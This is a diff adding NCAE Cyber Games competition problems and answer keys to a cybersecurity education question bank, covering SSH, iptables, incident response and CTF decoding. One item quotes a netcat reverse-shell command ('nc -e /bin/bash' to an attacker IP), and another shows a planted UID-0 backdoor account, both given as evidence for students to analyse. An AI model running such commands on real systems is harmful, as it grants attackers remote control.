@@ -1,4 +1,4 @@
-export type EducationLevel = "k12" | "university" | "professional";
+export type EducationLevel = "k12" | "university" | "professional" | "competition";
 
 export interface Problem {
 	id: string;
@@ -46,7 +46,18 @@ export const PROFESSIONAL_TOPICS = [
 	"cissp-software-security",
 ] as const;
 
-export const TOPICS = [...K12_TOPICS, ...UNIVERSITY_TOPICS, ...PROFESSIONAL_TOPICS] as const;
+export const COMPETITION_TOPICS = [
+	"ncae-linux-hardening",
+	"ncae-network-defense",
+	"ncae-service-uptime",
+	"ncae-scripting",
+	"ncae-incident-response",
+	"ncae-ctf-crypto",
+	"ncae-ctf-forensics",
+	"ncae-windows-hardening",
+] as const;
+
+export const TOPICS = [...K12_TOPICS, ...UNIVERSITY_TOPICS, ...PROFESSIONAL_TOPICS, ...COMPETITION_TOPICS] as const;
 
 export type Topic = (typeof TOPICS)[number];
 
@@ -74,9 +85,18 @@ export const TOPIC_LABELS: Record<Topic, string> = {
 	"cissp-security-assessment": "Domain 6: Security Assessment & Testing",
 	"cissp-security-operations": "Domain 7: Security Operations",
 	"cissp-software-security": "Domain 8: Software Development Security",
+	"ncae-linux-hardening": "Linux System Hardening",
+	"ncae-network-defense": "Network Defense",
+	"ncae-service-uptime": "Service Configuration & Uptime",
+	"ncae-scripting": "Scripting & Automation",
+	"ncae-incident-response": "Incident Detection & Response",
+	"ncae-ctf-crypto": "CTF: Cryptography",
+	"ncae-ctf-forensics": "CTF: Digital Forensics",
+	"ncae-windows-hardening": "Windows System Hardening",
 };
 
 export function getTopicsForLevel(level: EducationLevel): Topic[] {
+	if (level === "competition") return [...COMPETITION_TOPICS];
 	if (level === "professional") return [...PROFESSIONAL_TOPICS];
 	if (level === "university") return [...UNIVERSITY_TOPICS];
 	return [...K12_TOPICS];
@@ -1559,6 +1579,528 @@ const PROBLEM_BANK: Problem[] = [
 			"Thinking pen testing is no longer needed — it validates all other controls; it's still needed, just not the only activity",
 		],
 		prerequisites: ["sdlc-phases", "agile-methodology", "security-testing-tools"],
+		difficulty: "on-grade",
+	},
+
+	// ══════════════════════════════════════
+	// ── COMPETITION: NCAE CYBER GAMES ──
+	// ══════════════════════════════════════
+
+	// ── Linux System Hardening ──
+	{
+		id: "ncae-lh-1",
+		topic: "ncae-linux-hardening",
+		subtopic: "ssh-hardening",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"You've been given a Linux server for the competition. The SSH config (/etc/ssh/sshd_config) has these settings:\n\nPermitRootLogin yes\nPasswordAuthentication yes\nPort 22\nX11Forwarding yes\nMaxAuthTries 6\n\nThe red team will be attacking within the hour. What changes do you make to harden SSH, and in what order of priority?",
+		correctAnswer:
+			"Priority order: (1) PermitRootLogin no — prevents direct root compromise. (2) Create a non-root user with sudo, set a strong password. (3) Change Port to a non-standard port (e.g., 2222). (4) X11Forwarding no — reduces attack surface. (5) MaxAuthTries 3 — limits brute force. (6) Consider adding AllowUsers to whitelist only your team's accounts. Then restart sshd: systemctl restart sshd.",
+		solutionSteps: [
+			"First priority: PermitRootLogin no — if the red team guesses the root password, they own the box instantly",
+			"Before disabling root login, create a non-root user: useradd -m -s /bin/bash teamuser && passwd teamuser && usermod -aG sudo teamuser",
+			"Test that the new user can SSH in and sudo before locking out root",
+			"Change the port: Port 2222 — won't stop a port scan but slows automated attacks",
+			"X11Forwarding no — X11 forwarding can be exploited for local privilege escalation",
+			"MaxAuthTries 3 — reduces brute force window from 6 to 3 attempts per connection",
+			"Optional: AllowUsers teamuser — whitelist only specific accounts that should have SSH access",
+			"Apply changes: systemctl restart sshd (keep your current session open while testing!)",
+		],
+		commonMisconceptions: [
+			"Disabling root login before creating an alternative account — you'll lock yourself out",
+			"Thinking changing the port is strong security — it's obscurity, not security, but it helps against automated bots",
+			"Restarting sshd and closing your session before testing — always keep one session open as a fallback",
+			"Not setting PasswordAuthentication to 'no' when key-based auth is available — passwords can be brute-forced",
+			"Forgetting to restart sshd after changing the config — changes don't take effect until the service reloads",
+		],
+		prerequisites: ["linux-basics", "ssh-fundamentals", "text-editors"],
+		difficulty: "foundational",
+	},
+	{
+		id: "ncae-lh-2",
+		topic: "ncae-linux-hardening",
+		subtopic: "user-audit",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"You run 'cat /etc/passwd' on your server and see these entries:\n\nroot:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/tmp:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash\nguest:x:1001:1001:Guest:/home/guest:/bin/bash\nftp:x:1002:1002:FTP User:/srv/ftp:/bin/bash\n\nWhat's wrong here, and what commands would you run to fix it?",
+		correctAnswer:
+			"Critical issue: 'backdoor' has UID 0 — it's a root-level account likely planted by the red team. Its home directory is /tmp (suspicious). Fix: (1) userdel -r backdoor. (2) Lock the guest account: usermod -L guest or userdel guest. (3) Set FTP user to nologin shell: usermod -s /usr/sbin/nologin ftp. (4) Check for other UID 0 accounts: awk -F: '$3 == 0' /etc/passwd. (5) Check /etc/shadow for accounts with no password.",
+		solutionSteps: [
+			"The 'backdoor' account has UID 0 — any account with UID 0 has full root privileges regardless of username",
+			"Its home is /tmp (world-writable, suspicious) and it has /bin/bash (interactive login) — this is a planted backdoor",
+			"Remove it immediately: userdel -r backdoor",
+			"Check if backdoor had any running processes: ps aux | grep backdoor",
+			"Check for additional UID 0 accounts: awk -F: '$3 == 0' /etc/passwd — only root should have UID 0",
+			"The guest account is risky in a competition — either lock it (usermod -L guest) or remove it (userdel -r guest)",
+			"FTP user should not have an interactive shell: usermod -s /usr/sbin/nologin ftp",
+			"Check for accounts with empty passwords: awk -F: '$2 == \"\"' /etc/shadow",
+			"Review /etc/group for any unexpected group memberships, especially sudo/wheel",
+		],
+		commonMisconceptions: [
+			"Not recognizing that UID 0 is what makes an account root — the username doesn't matter, the UID does",
+			"Only checking the username 'root' instead of all accounts with UID 0",
+			"Forgetting to check for running processes from the backdoor account before deleting it",
+			"Not checking /etc/shadow for accounts with empty password fields — those can log in without any password",
+			"Leaving the FTP user with /bin/bash — service accounts should use /usr/sbin/nologin or /bin/false",
+		],
+		prerequisites: ["linux-users", "passwd-file-format", "user-management-commands"],
+		difficulty: "on-grade",
+	},
+
+	// ── Network Defense ──
+	{
+		id: "ncae-nd-1",
+		topic: "ncae-network-defense",
+		subtopic: "iptables-basics",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"Your team's server runs a web server (HTTP/HTTPS) and SSH. Write iptables rules that: (1) Allow incoming SSH (port 22) only from your team's subnet 10.0.1.0/24. (2) Allow incoming HTTP (80) and HTTPS (443) from anywhere. (3) Allow all established/related connections. (4) Drop everything else. Write the commands in order.",
+		correctAnswer:
+			"iptables -F\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp -s 10.0.1.0/24 --dport 22 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT",
+		solutionSteps: [
+			"First, flush existing rules to start clean: iptables -F",
+			"Allow established connections first (so your current SSH session doesn't drop): iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
+			"Allow SSH only from your team's subnet: iptables -A INPUT -p tcp -s 10.0.1.0/24 --dport 22 -j ACCEPT",
+			"Allow HTTP from anywhere: iptables -A INPUT -p tcp --dport 80 -j ACCEPT",
+			"Allow HTTPS from anywhere: iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
+			"Allow loopback traffic (many services need this): iptables -A INPUT -i lo -j ACCEPT",
+			"Set default policy to DROP: iptables -P INPUT DROP",
+			"Drop forwarded traffic: iptables -P FORWARD DROP",
+			"Allow outbound traffic: iptables -P OUTPUT ACCEPT",
+			"Save the rules so they persist: iptables-save > /etc/iptables.rules",
+		],
+		commonMisconceptions: [
+			"Setting the DROP policy before adding ACCEPT rules — you'll lock yourself out of SSH immediately",
+			"Forgetting the ESTABLISHED,RELATED rule — your own outbound connections (DNS, updates) will break",
+			"Not allowing loopback (lo) traffic — many local services communicate over localhost and will fail",
+			"Confusing -s (source) with -d (destination) — for incoming rules, restrict the source IP, not destination",
+			"Forgetting to save rules — iptables rules are lost on reboot without explicit save",
+		],
+		prerequisites: ["networking-basics", "tcp-ports", "linux-command-line"],
+		difficulty: "foundational",
+	},
+	{
+		id: "ncae-nd-2",
+		topic: "ncae-network-defense",
+		subtopic: "dns-attack",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"During the competition, your team's DNS server suddenly starts resolving 'google.com' to 192.168.1.100 (an IP on the competition network). Users report they can't reach external sites. You check your BIND zone files and they look correct. What type of attack is this, how do you investigate, and how do you fix it?",
+		correctAnswer:
+			"This is DNS cache poisoning — the attacker injected forged DNS responses into your resolver's cache. Investigation: (1) Check the cache: rndc dumpdb -cache, then grep for the poisoned entry. (2) Flush the cache: rndc flush. (3) Prevention: enable DNSSEC validation, restrict recursion to trusted IPs only (allow-recursion), set 'dnssec-validation auto;' in named.conf, and consider rate-limiting queries.",
+		solutionSteps: [
+			"Identify the attack: correct zone files but wrong answers = the cache has been poisoned, not the authoritative data",
+			"This is DNS cache poisoning — the attacker sent forged responses that the resolver cached as legitimate",
+			"Investigate: dump the DNS cache to see the poisoned entries — rndc dumpdb -cache",
+			"Examine the dump file (usually /var/cache/bind/named_dump.db) for suspicious entries",
+			"Immediate fix: flush the entire DNS cache — rndc flush",
+			"Verify resolution works again: dig google.com @localhost",
+			"Prevention: restrict who can use your resolver for recursion — add 'allow-recursion { 10.0.1.0/24; localhost; };' to named.conf",
+			"Enable DNSSEC validation: set 'dnssec-validation auto;' in named.conf options",
+			"Consider randomizing source ports (most modern BIND does this by default) to make cache poisoning harder",
+		],
+		commonMisconceptions: [
+			"Assuming the zone files were modified — cache poisoning affects the resolver cache, not the zone files",
+			"Restarting BIND instead of just flushing the cache — a restart works but is slower and causes a service interruption",
+			"Not restricting recursion — an open recursive resolver is an easy target for cache poisoning and DNS amplification attacks",
+			"Thinking DNSSEC prevents all DNS attacks — it prevents cache poisoning of signed zones but doesn't help with unsigned domains",
+			"Checking only /etc/hosts — while /etc/hosts could be modified by an attacker, the symptoms described point to cache poisoning",
+		],
+		prerequisites: ["dns-fundamentals", "bind-basics", "network-protocols"],
+		difficulty: "on-grade",
+	},
+
+	// ── Service Configuration & Uptime ──
+	{
+		id: "ncae-su-1",
+		topic: "ncae-service-uptime",
+		subtopic: "web-server-recovery",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"Your team is scored on keeping Apache running and serving the correct content. The service has stopped. Running 'systemctl status apache2' shows: 'AH00526: Syntax error on line 47 of /etc/apache2/sites-enabled/000-default.conf'. What steps do you take to diagnose and fix this, and how do you prevent it during the competition?",
+		correctAnswer:
+			"(1) Check the config syntax: apache2ctl configtest — this pinpoints the exact error. (2) Open the file and fix line 47. (3) Before fixing, check if the red team modified it: ls -la /etc/apache2/sites-enabled/ and check timestamps. (4) Start the service: systemctl start apache2. (5) Prevention: make a backup copy of all working configs at the start (cp -r /etc/apache2 /root/apache2-backup), and set up a cron or script to monitor the service.",
+		solutionSteps: [
+			"Run apache2ctl configtest to see the exact syntax error (more detail than systemctl status)",
+			"Open /etc/apache2/sites-enabled/000-default.conf and examine line 47",
+			"Check if the red team modified the file: stat /etc/apache2/sites-enabled/000-default.conf (look at modify time)",
+			"Fix the syntax error — common red team tricks: adding invalid directives, removing closing tags, inserting special characters",
+			"Test the fix: apache2ctl configtest (should say 'Syntax OK')",
+			"Start the service: systemctl start apache2",
+			"Verify it's serving correctly: curl http://localhost",
+			"Prevention: at competition start, back up all configs — cp -r /etc/apache2 /root/apache2-backup",
+			"Set up monitoring: a cron job or loop that checks 'systemctl is-active apache2' and restarts if needed",
+			"Consider making config files immutable during the competition: chattr +i /etc/apache2/sites-enabled/000-default.conf",
+		],
+		commonMisconceptions: [
+			"Trying to start the service without fixing the config — it will just fail again with the same error",
+			"Reinstalling Apache instead of fixing the config — you'll lose all your configuration and waste time",
+			"Not checking if the red team broke it — if they did it once, they'll do it again; you need to prevent recurrence",
+			"Editing the wrong file — sites-enabled often contains symlinks to sites-available; check which one to edit",
+			"Not backing up configs at the start of the competition — this is the single most important prep step for service defense",
+		],
+		prerequisites: ["apache-basics", "linux-services", "systemctl"],
+		difficulty: "foundational",
+	},
+	{
+		id: "ncae-su-2",
+		topic: "ncae-service-uptime",
+		subtopic: "database-under-attack",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"Your MySQL database is a scored service. It's running extremely slowly. Running 'SHOW PROCESSLIST;' reveals hundreds of connections from IP 10.0.99.5 (a red team IP) all running 'SELECT SLEEP(30)'. Legitimate scoring checks are timing out. How do you handle this without taking the database offline?",
+		correctAnswer:
+			"(1) Kill the malicious connections: SELECT GROUP_CONCAT('KILL ', id SEPARATOR '; ') FROM information_schema.processlist WHERE host LIKE '10.0.99.5%'; — execute the output. (2) Block the IP at the firewall: iptables -A INPUT -s 10.0.99.5 -p tcp --dport 3306 -j DROP. (3) Set max connections per user and enable max_connect_errors. (4) If there's a MySQL user the attacker is using, revoke their access or change their password. (5) Check for other slow queries they may have planted.",
+		solutionSteps: [
+			"Identify the scope: SHOW PROCESSLIST; — count how many malicious connections exist",
+			"Generate kill statements for all connections from the attacker IP:",
+			"SELECT CONCAT('KILL ', id, ';') FROM information_schema.processlist WHERE host LIKE '10.0.99.5%';",
+			"Execute all the KILL statements to terminate the sleeping connections",
+			"Or use a one-liner: mysqladmin -u root processlist | grep '10.0.99.5' | awk '{print $2}' | xargs -I{} mysqladmin -u root kill {}",
+			"Block the IP at the firewall immediately: iptables -I INPUT -s 10.0.99.5 -p tcp --dport 3306 -j DROP",
+			"Harden MySQL: SET GLOBAL max_connections = 100; and SET GLOBAL max_connect_errors = 10;",
+			"Check which MySQL user the attacker used: SELECT user, host FROM mysql.user WHERE host LIKE '%10.0.99%';",
+			"If found, drop or restrict the user: DROP USER 'attacker_user'@'%';",
+			"Change the root password if it's weak: ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_strong_password';",
+		],
+		commonMisconceptions: [
+			"Restarting MySQL — this drops ALL connections including scoring checks, and the attacker will just reconnect",
+			"Only killing connections without blocking the IP — the attacker will immediately re-establish hundreds of connections",
+			"Blocking the IP in MySQL (host deny) but not at the firewall — the connections still reach MySQL and consume resources",
+			"Not checking which MySQL user the attacker is using — they may have a valid account that needs to be revoked",
+			"Ignoring the possibility of planted slow queries or triggers — check for any database objects the attacker may have created",
+		],
+		prerequisites: ["mysql-basics", "sql-fundamentals", "iptables-basics"],
+		difficulty: "on-grade",
+	},
+
+	// ── Scripting & Automation ──
+	{
+		id: "ncae-sc-1",
+		topic: "ncae-scripting",
+		subtopic: "service-monitor",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"During the competition, you need to monitor if your scored services (SSH on port 22, HTTP on port 80, HTTPS on port 443, and MySQL on port 3306) are running. Write a bash script that checks each service every 30 seconds and prints an alert with a timestamp if any port stops responding.",
+		correctAnswer:
+			"#!/bin/bash\nSERVICES=(\"22:SSH\" \"80:HTTP\" \"443:HTTPS\" \"3306:MySQL\")\nwhile true; do\n  for svc in \"${SERVICES[@]}\"; do\n    port=$(echo $svc | cut -d: -f1)\n    name=$(echo $svc | cut -d: -f2)\n    if ! nc -z -w2 localhost $port 2>/dev/null; then\n      echo \"[$(date '+%H:%M:%S')] ALERT: $name (port $port) is DOWN!\"\n    fi\n  done\n  sleep 30\ndone",
+		solutionSteps: [
+			"Use a while true loop for continuous monitoring",
+			"Define services as an array of port:name pairs for easy maintenance",
+			"Use netcat (nc -z) to check if each port is listening — -z means scan only, -w2 sets a 2-second timeout",
+			"Alternatively use: ss -tlnp | grep :PORT or bash's built-in /dev/tcp: echo > /dev/tcp/localhost/PORT",
+			"Include a timestamp in alerts so you know exactly when a service went down",
+			"sleep 30 between checks — not too frequent (wastes CPU) but frequent enough to catch outages quickly",
+			"Run it in the background: nohup ./monitor.sh &, or in a tmux/screen session so it survives disconnection",
+			"Enhancement: automatically restart failed services — if [ $? -ne 0 ]; then systemctl restart $name; fi",
+		],
+		commonMisconceptions: [
+			"Using ping to check services — ping tests network connectivity, not whether a service is actually listening on a port",
+			"Checking only if the process exists (ps aux | grep) — a process can be running but not accepting connections",
+			"Not setting a timeout on the port check — without -w2, nc can hang for a long time on unresponsive services",
+			"Running the script in the foreground of your only terminal — use tmux, screen, or background it with &",
+			"Checking too frequently (every 1 second) — creates unnecessary load; every 30 seconds is plenty for scoring",
+		],
+		prerequisites: ["bash-basics", "loops", "netcat", "linux-services"],
+		difficulty: "foundational",
+	},
+	{
+		id: "ncae-sc-2",
+		topic: "ncae-scripting",
+		subtopic: "automated-defense",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"The red team keeps adding unauthorized SSH keys to /root/.ssh/authorized_keys and creating new user accounts with UID 0 (root-level). These changes happen every few minutes. Write a bash script that monitors for and automatically reverts these changes.",
+		correctAnswer:
+			"#!/bin/bash\nGOOD_KEYS=/root/.ssh/authorized_keys.clean\ncp /root/.ssh/authorized_keys $GOOD_KEYS\nwhile true; do\n  # Restore authorized_keys if modified\n  if ! diff -q /root/.ssh/authorized_keys $GOOD_KEYS >/dev/null 2>&1; then\n    cp $GOOD_KEYS /root/.ssh/authorized_keys\n    chmod 600 /root/.ssh/authorized_keys\n    echo \"[$(date)] Restored authorized_keys\"\n  fi\n  # Remove any non-root UID 0 accounts\n  awk -F: '$3 == 0 && $1 != \"root\"' /etc/passwd | while read line; do\n    user=$(echo $line | cut -d: -f1)\n    userdel -rf $user 2>/dev/null\n    echo \"[$(date)] Removed UID 0 account: $user\"\n  done\n  sleep 10\ndone",
+		solutionSteps: [
+			"First, save a known-good copy of authorized_keys: cp /root/.ssh/authorized_keys /root/.ssh/authorized_keys.clean",
+			"Use diff to detect if the file has been modified since the known-good copy",
+			"If modified, overwrite with the clean copy and reset permissions to 600",
+			"For UID 0 detection: parse /etc/passwd for any accounts with UID 0 that aren't 'root'",
+			"awk -F: '$3 == 0 && $1 != \"root\"' /etc/passwd — finds rogue root-level accounts",
+			"Remove them with userdel -rf to delete the user and their files",
+			"Log every action with timestamps so you can report to the competition judges",
+			"Run this in a loop every 10 seconds — frequent enough to catch changes before scoring checks",
+			"Make the script itself hard to kill: run it in a screen/tmux session, or set it as a systemd service",
+			"Enhancement: use inotifywait (from inotify-tools) to watch files in real-time instead of polling",
+		],
+		commonMisconceptions: [
+			"Only cleaning authorized_keys once — the red team will keep re-adding keys; you need continuous monitoring",
+			"Not preserving a clean copy first — if the file is already compromised when you start, you'll be restoring bad keys",
+			"Checking /etc/passwd but not /etc/shadow — an account with no password in shadow is even more dangerous",
+			"Making the monitoring interval too long — 10-30 seconds is good; 5 minutes is too slow for a competition",
+			"Not protecting the script itself — the red team may try to kill your defense scripts; use systemd or chattr +i",
+		],
+		prerequisites: ["bash-scripting", "file-comparison", "user-management", "cron-basics"],
+		difficulty: "on-grade",
+	},
+
+	// ── Incident Detection & Response ──
+	{
+		id: "ncae-ir-1",
+		topic: "ncae-incident-response",
+		subtopic: "log-analysis",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"You're monitoring /var/log/auth.log during the competition and see these entries within 2 minutes:\n\nMar 15 14:22:01 server sshd[4521]: Failed password for root from 10.0.99.12 port 44231\n(... repeated 50 times ...)\nMar 15 14:23:47 server sshd[4571]: Accepted password for admin from 10.0.99.12 port 44281\nMar 15 14:23:49 server sshd[4571]: pam_unix(sshd:session): session opened for user admin\n\nWhat just happened? What do you do RIGHT NOW? List your actions in order of priority.",
+		correctAnswer:
+			"A brute-force attack on root failed, but the attacker successfully logged in as 'admin' — meaning admin had a weak or guessable password. Priority actions: (1) Kill the attacker's session immediately: who -u to find the PID, then kill -9 PID. (2) Change admin's password NOW: passwd admin. (3) Block the attacker IP: iptables -I INPUT -s 10.0.99.12 -j DROP. (4) Check what they've done: grep admin /var/log/auth.log, check bash_history, look for new files in /tmp. (5) Check for persistence: crontab -l -u admin, check authorized_keys.",
+		solutionSteps: [
+			"Read the logs: 50 failed root attempts then a successful admin login from the same IP = brute force succeeded on a weak account",
+			"IMMEDIATE: find and kill the attacker's active session — who -u shows logged in users with PIDs",
+			"Kill the session: kill -9 <PID> — don't be gentle, use -9 to force kill",
+			"Change admin's password immediately: passwd admin — use a strong password",
+			"Block the IP at the firewall: iptables -I INPUT -s 10.0.99.12 -j DROP (use -I to insert at top, not -A to append)",
+			"Investigate what the attacker did while connected: check /home/admin/.bash_history, /root/.bash_history if they escalated",
+			"Look for persistence mechanisms: crontab -l, check /etc/crontab, look in /etc/cron.d/",
+			"Check for new files: find / -user admin -newer /var/log/auth.log -type f 2>/dev/null",
+			"Check for unauthorized SSH keys: cat /home/admin/.ssh/authorized_keys and /root/.ssh/authorized_keys",
+			"Verify no new UID 0 accounts: awk -F: '$3 == 0' /etc/passwd",
+		],
+		commonMisconceptions: [
+			"Focusing on the failed root attempts instead of the successful admin login — the admin compromise is the real threat",
+			"Blocking the IP first before killing the session — the attacker is already inside; kill their session first",
+			"Only changing the password without checking for persistence — they may have planted backdoors that survive a password change",
+			"Not checking bash_history — this tells you exactly what commands the attacker ran",
+			"Assuming the attacker only compromised admin — they may have escalated to root within seconds of logging in",
+		],
+		prerequisites: ["log-reading", "linux-user-management", "iptables-basics"],
+		difficulty: "foundational",
+	},
+	{
+		id: "ncae-ir-2",
+		topic: "ncae-incident-response",
+		subtopic: "process-investigation",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"Running 'ps aux' on your server, you spot this process:\n\nnobody  12847  98.2  0.1  4520  1204 ?  R  14:30  5:22 /tmp/.x/nc -e /bin/bash 10.0.99.5 4444\n\nWhat is this process doing? What commands would you run to investigate and remediate? Be specific about the order.",
+		correctAnswer:
+			"This is a reverse shell — netcat (nc) is connecting back to the attacker at 10.0.99.5:4444 and piping /bin/bash to them, giving them interactive shell access. The 98.2% CPU and the hidden directory (/tmp/.x/) confirm malicious intent. Actions: (1) kill -9 12847. (2) rm -rf /tmp/.x/. (3) iptables -I OUTPUT -d 10.0.99.5 -j DROP (block outbound to attacker). (4) Check how it got there: look for cron jobs, other /tmp files, and what user 'nobody' has been doing.",
+		solutionSteps: [
+			"Identify the threat: 'nc -e /bin/bash 10.0.99.5 4444' is a textbook reverse shell",
+			"nc (netcat) with -e /bin/bash connects to the attacker and gives them a live bash session",
+			"It's running as 'nobody' from a hidden directory (/tmp/.x/) — clearly planted by the attacker",
+			"IMMEDIATE: kill the process — kill -9 12847",
+			"Remove the malicious files: rm -rf /tmp/.x/",
+			"Block outbound connections to the attacker: iptables -I OUTPUT -d 10.0.99.5 -j DROP",
+			"Check how it was started: look for cron entries — crontab -l -u nobody, grep -r '10.0.99.5' /etc/cron*",
+			"Check for other reverse shells or backdoors: netstat -tlnp | grep ESTABLISHED, ps aux | grep nc",
+			"Look for more hidden files: find /tmp -name '.*' -type f and find /tmp -name '.*' -type d",
+			"Check if the attacker planted a systemd service: find /etc/systemd -newer /etc/hostname -type f",
+		],
+		commonMisconceptions: [
+			"Not recognizing 'nc -e /bin/bash' as a reverse shell — this is one of the most common backdoor techniques",
+			"Only killing the process without blocking outbound traffic — the cron or a respawning script will restart it",
+			"Blocking only inbound from the attacker — the reverse shell is an OUTBOUND connection from your server",
+			"Ignoring the hidden directory /tmp/.x/ — it likely contains other tools the attacker dropped",
+			"Not checking for persistence — if a cron job restarts the shell, killing it once is useless",
+		],
+		prerequisites: ["linux-processes", "netcat-basics", "networking-concepts"],
+		difficulty: "on-grade",
+	},
+
+	// ── CTF: Cryptography ──
+	{
+		id: "ncae-cc-1",
+		topic: "ncae-ctf-crypto",
+		subtopic: "encoding",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"During a CTF challenge, you find a file containing this string:\n\nbmNhZXtmbGFnX2ZvdW5kXzEyM30=\n\nWhat encoding is this, how do you identify it, how do you decode it, and what's the flag?",
+		correctAnswer:
+			"This is Base64 encoding. Indicators: the character set (a-z, A-Z, 0-9, +, /), the = padding at the end, and the string length being a multiple of 4. Decode with: echo 'bmNhZXtmbGFnX2ZvdW5kXzEyM30=' | base64 -d. The flag is: ncae{flag_found_123}.",
+		solutionSteps: [
+			"Recognize Base64: alphanumeric characters plus + and /, with = padding at the end",
+			"The trailing '=' is a strong indicator — Base64 pads to multiples of 4 characters",
+			"Decode: echo 'bmNhZXtmbGFnX2ZvdW5kXzEyM30=' | base64 -d",
+			"Alternative: use Python — import base64; base64.b64decode('bmNhZXtmbGFnX2ZvdW5kXzEyM30=')",
+			"Or use CyberChef (a web tool commonly used in CTFs) — paste the string and apply 'From Base64'",
+			"The decoded flag is: ncae{flag_found_123}",
+			"Common encoding ladder in CTFs: hex → Base64 → Base32 → URL encoding — try each when stuck",
+		],
+		commonMisconceptions: [
+			"Confusing Base64 with encryption — Base64 is encoding (reversible, no key needed), not encryption",
+			"Not recognizing the = padding — some Base64 strings don't have padding, but when present it's a dead giveaway",
+			"Trying to brute force or decrypt it — always try simple encodings (Base64, hex, URL encode) before assuming crypto",
+			"Forgetting that CTF flags often have a known format (ncae{...}) — look for that pattern after decoding",
+			"Using the wrong tool — base64 -d on Linux, base64 -D on macOS (different flags)",
+		],
+		prerequisites: ["encoding-vs-encryption", "base64-concept", "command-line-basics"],
+		difficulty: "foundational",
+	},
+	{
+		id: "ncae-cc-2",
+		topic: "ncae-ctf-crypto",
+		subtopic: "caesar-cipher",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"You intercept this message from a CTF challenge:\n\napnr{ebgngvba_vf_abg_rapelcgvba}\n\nYou suspect it's a simple substitution cipher. What type of cipher is this, how do you identify the rotation, and what's the plaintext?",
+		correctAnswer:
+			"This is a ROT13 Caesar cipher (rotation of 13). You can identify it because: the format 'xxxx{...}' matches a CTF flag format, and ROT13 of 'apnr' = 'ncae' (the expected flag prefix). Decode: echo 'apnr{ebgngvba_vf_abg_rapelcgvba}' | tr 'a-zA-Z' 'n-za-mN-ZA-M'. The plaintext is: ncae{rotation_is_not_encryption}.",
+		solutionSteps: [
+			"Recognize the pattern: xxxx{...} looks like a CTF flag format, meaning the first part should decode to a known prefix",
+			"If you know flags start with 'ncae', try to find the rotation: n→a is a shift of 13, c→p is shift of 13 — it's ROT13",
+			"ROT13 is a special case of the Caesar cipher where the rotation is 13 (half the 26-letter alphabet)",
+			"ROT13 is its own inverse — applying it twice returns the original text",
+			"Decode with tr: echo 'apnr{ebgngvba_vf_abg_rapelcgvba}' | tr 'a-zA-Z' 'n-za-mN-ZA-M'",
+			"Alternative: use Python — import codecs; codecs.decode('apnr{ebgngvba_vf_abg_rapelcgvba}', 'rot_13')",
+			"The plaintext: ncae{rotation_is_not_encryption}",
+			"The flag itself contains a lesson: rotation ciphers are NOT encryption — they provide zero security",
+		],
+		commonMisconceptions: [
+			"Trying all 25 rotations manually — knowing the expected flag prefix lets you calculate the rotation instantly",
+			"Thinking ROT13 is secure — it's trivially reversible and is used in CTFs to teach that encoding is not encryption",
+			"Confusing Caesar cipher with more complex substitution ciphers — Caesar is a fixed rotation, not a random letter mapping",
+			"Not recognizing the flag format as a clue — if you know the prefix, you can deduce the rotation algebraically",
+			"Applying the rotation to non-alphabetic characters — numbers, braces, and underscores stay unchanged in a Caesar cipher",
+		],
+		prerequisites: ["cipher-basics", "ascii-alphabets", "command-line-tools"],
+		difficulty: "on-grade",
+	},
+
+	// ── CTF: Digital Forensics ──
+	{
+		id: "ncae-cf-1",
+		topic: "ncae-ctf-forensics",
+		subtopic: "file-analysis",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"A CTF challenge gives you a file called 'image.jpg' that doesn't open in any image viewer. Running 'file image.jpg' returns: 'image.jpg: Zip archive data, at least v2.0 to extract'. What happened here, and what steps do you take to extract and analyze the contents?",
+		correctAnswer:
+			"The file extension is misleading — it's actually a ZIP archive, not a JPEG. The 'file' command checks the magic bytes (file header), not the extension. Steps: (1) Rename it: mv image.jpg image.zip. (2) Extract: unzip image.zip. (3) Examine contents: ls -la the extracted files. (4) Run 'file' on each extracted file to check for more misdirection. (5) Look for flag files, hidden files (ls -la), and use strings/grep to search for flag patterns.",
+		solutionSteps: [
+			"The 'file' command reads the magic bytes (first bytes of the file) to determine the true file type",
+			"JPEG files start with FF D8 FF, ZIP files start with PK (50 4B) — the file command detected ZIP magic bytes",
+			"Don't trust file extensions — they're just labels and can be changed to anything",
+			"Rename and extract: mv image.jpg image.zip && unzip image.zip",
+			"Or skip renaming: unzip image.jpg (unzip doesn't care about the extension)",
+			"List extracted contents with ls -la (the -a flag shows hidden files starting with .)",
+			"Run 'file' on each extracted file — there may be more layers of misdirection",
+			"Search for flags: grep -r 'ncae{' . (recursively search all files for the flag format)",
+			"Use 'strings' on any binary files: strings extracted_file | grep ncae",
+			"Check for steganography: if there IS a real image, the flag might be hidden inside it (use steghide, exiftool, or binwalk)",
+		],
+		commonMisconceptions: [
+			"Trying to 'fix' the file as a JPEG — it's not a JPEG, it's a ZIP archive with a wrong extension",
+			"Trusting file extensions instead of using the 'file' command — this is the #1 CTF forensics lesson",
+			"Not checking for hidden files after extraction — CTF flags are often in dotfiles like .flag or .hidden",
+			"Forgetting to recursively search for flags — the flag might be nested several directories deep",
+			"Not considering that there could be multiple layers — a ZIP inside a ZIP inside a renamed file is common in CTFs",
+		],
+		prerequisites: ["file-command", "magic-bytes", "zip-archives", "command-line-basics"],
+		difficulty: "foundational",
+	},
